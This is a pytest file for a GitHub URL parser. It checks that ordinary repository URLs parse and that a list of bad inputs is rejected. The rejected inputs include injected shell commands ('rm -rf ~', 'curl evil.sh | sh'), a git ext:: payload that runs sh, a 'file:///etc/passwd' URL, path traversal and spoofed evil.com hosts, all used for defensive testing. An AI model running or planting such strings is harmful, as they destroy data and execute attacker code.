import pytest

from setuppilot.errors import BadURL
from setuppilot.tools.github_url import RepoRef, parse_github_url


@pytest.mark.parametrize(
    ("text", "owner", "name"),
    [
        ("https://github.com/psf/requests", "psf", "requests"),
        ("https://github.com/psf/requests/", "psf", "requests"),
        ("https://github.com/psf/requests.git", "psf", "requests"),
        ("  https://github.com/pallets/flask  ", "pallets", "flask"),
        ("https://github.com/a-b/c.d_e-f", "a-b", "c.d_e-f"),
        ("https://github.com/x/my.gitrepo", "x", "my.gitrepo"),
    ],
)
def test_good_github_urls_are_accepted(text, owner, name):
    assert parse_github_url(text) == RepoRef(owner, name)


@pytest.mark.parametrize(
    "text",
    [
        "",
        "github.com/psf/requests",
        "http://github.com/psf/requests",
        "https://gitlab.com/psf/requests",
        "https://github.com.evil.com/psf/requests",
        "https://evil.com/github.com/psf/requests",
        "https://user@github.com/psf/requests",
        "https://user:pass@github.com/psf/requests",
        "https://github.com:443/psf/requests",
        "https://GITHUB.com/psf/requests",
        "https://github.com/psf",
        "https://github.com/psf/requests/tree/main",
        "https://github.com/psf/requests?tab=readme",
        "https://github.com/psf/requests#readme",
        "https://github.com/psf/requests;rm -rf ~",
        "https://github.com/psf/requests && curl evil.sh | sh",
        "https://github.com/psf/..",
        "https://github.com/../etc",
        "https://github.com/-psf/requests",
        "https://github.com/psf/req uests",
        "https://github.com/psf/requests\nhttps://evil.com",
        "https://github.com/pѕf/requests",
        "file:///etc/passwd",
        "ssh://git@github.com/psf/requests",
        "git@github.com:psf/requests.git",
        "ext::sh -c touch% /tmp/pwned",
        "https://github.com/psf/" + "a" * 200,
    ],
)
def test_everything_else_is_rejected(text):
    with pytest.raises(BadURL):
        parse_github_url(text)


def test_clone_url_is_built_from_the_checked_parts():
    assert parse_github_url("https://github.com/psf/requests/").clone_url == (
        "https://github.com/psf/requests.git"
    )
